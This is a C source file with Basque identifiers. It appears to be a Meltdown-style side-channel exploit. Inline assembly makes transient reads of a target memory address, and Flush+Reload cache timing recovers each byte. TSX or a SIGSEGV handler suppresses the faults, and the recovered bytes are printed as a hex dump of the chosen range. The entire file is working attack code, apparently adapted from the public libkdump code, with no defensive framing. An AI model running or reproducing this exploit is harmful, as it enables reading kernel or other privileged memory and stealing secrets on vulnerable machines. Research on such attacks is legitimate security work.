#include <cpuid.h>
#include <errno.h>
#include <fcntl.h>
#include <memory.h>
#include <pthread.h>
#include <sched.h>
#include <setjmp.h>
#include <signal.h>
#include <stdarg.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdint.h>
#include <stdio.h>
 
  
int cache_huts_atalasea = 0;
int saiakera_kopurua = 100;
int onartu_ondoren = 1; // Zenbat neurketa berdin izan behar diren irakurketa balioa onartzeko
int neurketa_kopurua = 3; // Helbide baterako egin beharreko neurketa kopurua
static char *_mem = NULL, *mem = NULL; // flush-reload erabiltzeko
static size_t fis = 0; // helburu helbidea, helbide birtuala izan beharko litzateke?
static int dbg = 0;

static jmp_buf buf;

#define _XBEGIN_STARTED (~0u)

// ---------------------------------------------------------------------------
#define urtu                                                               \
  asm volatile("1:\n"                                                          \
               "movq (%%rsi), %%rsi\n"                                         \
               "movzx (%%rcx), %%rax\n"                                         \
               "shl $12, %%rax\n"                                              \
               "jz 1b\n"                                                       \
               "movq (%%rbx,%%rax,1), %%rbx\n"                                 \
               :                                                               \
               : "c"(fis), "b"(mem), "S"(0)                                   \
               : "rax");

// ---------------------------------------------------------------------------
#define urtu_ez_nulu                                                        \
  asm volatile("1:\n"                                                          \
               "movzx (%%rcx), %%rax\n"                                         \
               "shl $12, %%rax\n"                                              \
               "jz 1b\n"                                                       \
               "movq (%%rbx,%%rax,1), %%rbx\n"                                 \
               :                                                               \
               : "c"(fis), "b"(mem)                                           \
               : "rax");

// ---------------------------------------------------------------------------
#define urtu_azkar                                                          \
  asm volatile("movzx (%%rcx), %%rax\n"                                         \
               "shl $12, %%rax\n"                                              \
               "movq (%%rbx,%%rax,1), %%rbx\n"                                 \
               :                                                               \
               : "c"(fis), "b"(mem)                                           \
               : "rax");
               
               
#define URTU urtu_ez_nulu 
// tsx + urtu/urtu_ez_nulu/urtu_azkar
// signal+

// ---------------------------------------------------------------------------
typedef enum { ERROREA, INFORMAZIOA, ARRAKASTA } d_ikur_t;

// ---------------------------------------------------------------------------
static void aztertu(d_ikur_t ikurra, const char *fmt, ...) {
  if (!dbg)
    return;

  switch (ikurra) {
  case ERROREA:
    printf("\x1b[31;1m[-]\x1b[0m ");
    break;
  case INFORMAZIOA:
    printf("\x1b[33;1m[.]\x1b[0m ");
    break;
  case ARRAKASTA:
    printf("\x1b[32;1m[+]\x1b[0m ");
    break;
  default:
    break;
  }
  va_list ap;
  va_start(ap, fmt);
  vfprintf(stdout, fmt, ap);
  va_end(ap);
}

// ---------------------------------------------------------------------------
static inline uint64_t rdtsc() {
  uint64_t a = 0, d = 0;
  asm volatile("mfence");
  asm volatile("rdtscp" : "=a"(a), "=d"(d) :: "rcx");

  a = (d << 32) | a;
  asm volatile("mfence");
  return a;
}

// ---------------------------------------------------------------------------
static inline void memoria_sarrera(void *p) {
  asm volatile("movq (%0), %%rax\n" : : "c"(p) : "rax");
}

// ---------------------------------------------------------------------------
static void garbitu(void *p) {
  asm volatile("clflush 0(%0)\n" : : "c"(p) : "rax");
}

// ---------------------------------------------------------------------------
static int __attribute__((always_inline)) garbitu_berriro_kargatu(void *ptr) {
  uint64_t hasiera = 0, amaiera = 0;

  hasiera = rdtsc();
  memoria_sarrera(ptr);
  amaiera = rdtsc();

  garbitu(ptr);

  if (amaiera - hasiera < cache_huts_atalasea) {
    return 1;
  }
  return 0;
}

static __attribute__((always_inline)) inline unsigned int xbegin(void) {
  unsigned egoera;
  //asm volatile("xbegin 1f \n 1:" : "=a"(egoera) : "a"(-1UL) : "memory");
  asm volatile(".byte 0xc7,0xf8,0x00,0x00,0x00,0x00" : "=a"(egoera) : "a"(-1UL) : "memory");
  return egoera;
}

// ---------------------------------------------------------------------------
static __attribute__((always_inline)) inline void xend(void) {
  //asm volatile("xend" ::: "memory");
  asm volatile(".byte 0x0f; .byte 0x01; .byte 0xd5" ::: "memory");
}

// ---------------------------------------------------------------------------
static void desblokeatu_seinalea(int sig_zenbakia __attribute__((__unused__))) {
  sigset_t seinaleak;
  sigemptyset(&seinaleak);
  sigaddset(&seinaleak, sig_zenbakia);
  sigprocmask(SIG_UNBLOCK, &seinaleak, NULL);
}

// ---------------------------------------------------------------------------
static void segfault_kudeatzailea(int sig_zenbakia) {
  (void)sig_zenbakia;
  desblokeatu_seinalea(SIGSEGV);
  longjmp(buf, 1);
}

// ---------------------------------------------------------------------------
static void detektatu_garbitu_berriro_kargatu_atalasea() {
  size_t kargatu_denbora = 0, garbitu_kargatu_denbora = 0, i, kopurua = 1000000;
  size_t dummy[16];
  size_t *ptr = dummy + 8;
  uint64_t hasiera = 0, amaiera = 0;

  memoria_sarrera(ptr);
  for (i = 0; i < kopurua; i++) {
    hasiera = rdtsc();
    memoria_sarrera(ptr);
    amaiera = rdtsc();
    kargatu_denbora += (amaiera - hasiera);
  }
  for (i = 0; i < kopurua; i++) {
    hasiera = rdtsc();
    memoria_sarrera(ptr);
    amaiera = rdtsc();
    garbitu(ptr);
    garbitu_kargatu_denbora += (amaiera - hasiera);
  }
  kargatu_denbora /= kopurua;
  garbitu_kargatu_denbora /= kopurua;

  aztertu(INFORMAZIOA, "Garbitu+Kargatu: %zd ziklo, Kargatu bakarrik: %zd ziklo\n",
        garbitu_kargatu_denbora, kargatu_denbora);
  cache_huts_atalasea = (garbitu_kargatu_denbora + kargatu_denbora * 2) / 3;
  aztertu(ARRAKASTA, "Garbitu+Kargatu atalasea: %zd ziklo\n",
        cache_huts_atalasea);
}

void garbiketa()
{
  if (!_mem) free(_mem);
}

void konfiguratu()
{
  int j;
  detektatu_garbitu_berriro_kargatu_atalasea();
  
  _mem = malloc(4096 * 300);
  if (!_mem) {
    errno = ENOMEM;
    return -1;
  }
  mem = (char *)(((size_t)_mem & ~0xfff) + 0x1000 * 2);
  memset(mem, 0xab, 4096 * 290);

  for (j = 0; j < 256; j++) {
    garbitu(mem + j * 4096);
  }
  
  if (signal(SIGSEGV, segfault_kudeatzailea) == SIG_ERR) {
      aztertu(ERROREA, "Ezin izan da seinale kudeatzailea konfiguratu\n");
      garbiketa();
      return -1;
  }
}

// ---------------------------------------------------------------------------
static int __attribute__((always_inline)) irakurri_balioa() {
  int i, aurkitua = 0;
  for (i = 0; i < 256; i++) {
    if (garbitu_berriro_kargatu(mem + i * 4096)) {
      aurkitua = i + 1;
    }
    sched_yield();
  }
  return aurkitua - 1;
}

// ---------------------------------------------------------------------------
int __attribute__((optimize("-Os"), noinline)) libkdump_irakurri_tsx() {
  uint64_t hasiera = 0, amaiera = 0;
  int saiakerak = saiakera_kopurua;
  while (saiakerak--) {
    if (xbegin() == _XBEGIN_STARTED) {
      URTU;
      xend();
    }
    int i;
    for (i = 0; i < 256; i++) {
      if (garbitu_berriro_kargatu(mem + i * 4096)) {
        if (i >= 1) {
          return i;
        }
      }
      sched_yield();
    }
    sched_yield();
  }
  return 0;
}

// ---------------------------------------------------------------------------
int __attribute__((optimize("-Os"), noinline)) libkdump_irakurri_seinale_kudeatzailea() {
  uint64_t hasiera = 0, amaiera = 0;
  int saiakerak = saiakera_kopurua;
  
  while (saiakerak--) {
    if (!setjmp(buf)) {
      URTU;
    }
    
    int i;
    for (i = 0; i < 256; i++) {
      if (garbitu_berriro_kargatu(mem + i * 4096)) {
        if (i >= 1) {
          return i;
        }
      }
      sched_yield();
    }
    sched_yield();
  }
  return 0;
}

// ---------------------------------------------------------------------------
int __attribute__((optimize("-O0"))) libkdump_irakurri(size_t helbidea) {
  fis = helbidea;

  char emaitza_estat[256];
  int i, j, r;
  for (i = 0; i < 256; i++)
    emaitza_estat[i] = 0;

  sched_yield();

  for (i = 0; i < neurketa_kopurua; i++) {
  //    r = libkdump_irakurri_tsx();
      r = libkdump_irakurri_seinale_kudeatzailea();
    emaitza_estat[r]++;
  }

  int max_b = 0, max_i = 0;

  if (dbg) {
    for (i = 0; i < sizeof(emaitza_estat); i++) {
      if (emaitza_estat[i] == 0)
        continue;
      aztertu(INFORMAZIOA, "emaitza_estat[%x] = %d\n",
            i, emaitza_estat[i]);
    }
  }

  for (i = 1; i < 256; i++) {
    if (emaitza_estat[i] > max_b && emaitza_estat[i] >= onartu_ondoren) {
      max_b = emaitza_estat[i];
      max_i = i;
    }
  }

  return max_i;
}

void inprimatu_hex(void* helbidea, const void* data, size_t tamaina) {
	char ascii[17];
	size_t i, j;
	ascii[16] = '\0';
   printf("0x%016lx | ", (unsigned long)helbidea);
	for (i = 0; i < tamaina; ++i) {
		printf("%02X ", ((unsigned char*)data)[i]);
		if (((unsigned char*)data)[i] >= ' ' && ((unsigned char*)data)[i] <= '~') {
			ascii[i % 16] = ((unsigned char*)data)[i];
		} else {
			ascii[i % 16] = '.';
		}
		if ((i+1) % 8 == 0 || i+1 == tamaina) {
			printf(" ");
			if ((i+1) % 16 == 0) {
				printf("|  %s \n", ascii);
			} else if (i+1 == tamaina) {
				ascii[(i+1) % 16] = '\0';
				if ((i+1) % 16 <= 8) {
					printf(" ");
				}
				for (j = (i+1) % 16; j < 16; ++j) {
					printf("   ");
				}
				printf("|  %s \n", ascii);
			}
		}
	}
}

int erabilera(void)
{
	printf("urtu: [helbidea_hex] [tamaina]\n");
	return 2;
}

int main(int argc, char** argv)
{
  konfiguratu();
  size_t hasiera_helbidea;
  size_t luzera;
  int t; unsigned char irakurri_buf[16];
  
  char *prog_izena = argv[0];
	 if (argc < 3)
		 return erabilera();

	 if (sscanf(argv[1], "%lx", &hasiera_helbidea) != 1)
		 return erabilera();

	 if (sscanf(argv[2], "%lx", &luzera) != 1)
		 return erabilera();
    
   int fd = open("/proc/version", O_RDONLY);
	 if (fd < 0) {
	 	 perror("ireki");
		 return -1;
	 }
  
  for(t = 0; t < luzera; t++)
  {
    if (t > 0 && 0 == t%16) {
      inprimatu_hex((void*)(hasiera_helbidea + t - 16), irakurri_buf, 16);
    }
    
    int emaitza = pread(fd, buf, sizeof(buf), 0);
      if (emaitza < 0) {
  	    perror("pread");
        return -1;
    }
        
    irakurri_buf[t%16] = libkdump_irakurri(hasiera_helbidea+t);
//    printf("emaitza: %d\n", libkdump_irakurri(hasiera_helbidea+t));
  }
  
  if (t > 0) {
      inprimatu_hex((void*)(hasiera_helbidea + ((t%16 ? t : (t-1))/16) * 16),
         irakurri_buf, t%16 ? t%16 : 16);
   }
}